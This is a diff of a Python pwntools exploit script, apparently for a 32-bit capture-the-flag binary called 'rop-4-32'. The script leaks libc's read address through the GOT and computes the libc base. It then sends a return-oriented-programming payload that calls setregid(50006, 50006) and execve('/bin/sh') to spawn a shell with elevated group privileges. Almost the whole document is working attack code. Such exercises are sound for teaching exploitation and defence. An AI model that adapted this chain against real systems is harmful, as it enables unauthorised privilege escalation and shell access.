@@ -2,11 +2,12 @@ from pwn import *
 import os
 
 DEBUG = False 
-file = "./rop-3-32"
+file = "./rop-4-32"
 env = {"PATH":"$PATH:."}
 
 elf = ELF(file)
-max_len = 0x9c
+libc = elf.libc
+max_len = 0x8c
 
 # launch the main process (still boilerplate)
 if DEBUG:
@@ -34,24 +35,35 @@ payload = flat (
     input_func,
     got_read
 )
+
 io.sendline(payload)
+io.recvuntil(b'\n!\n')
 
-libc_read = u32(io.recv()[??])
 
-elf.libc.address = libc_read - elf.libc.symbols["read"]
+libc_read = u32(io.recvline()[0:4])
+libc_address = libc_read - libc.symbols["read"]
 
-setregid = elf.libc.symbols["setregid"]
-execve = elf.libc.symbols["execve"]
+libc.address = libc_address
+
+print("libc_address", libc.address)
+
+setregid = libc.symbols["setregid"]
+print("setregid", hex(setregid))
+
+execve = libc.symbols["execve"]
+pop2 = p32(0x0804873a)
+binsh = next(libc.search(b'/bin/sh'))
+print(hex(binsh))
 
 payload = flat (
     b"A" * max_len,
     setregid,
-    pop_2,
+    pop2,
     p32(50006),
     p32(50006),
     execve,
     b"A" * 4,
-    bin_sh,
+    binsh,
     p32(0),
     p32(0),
 )
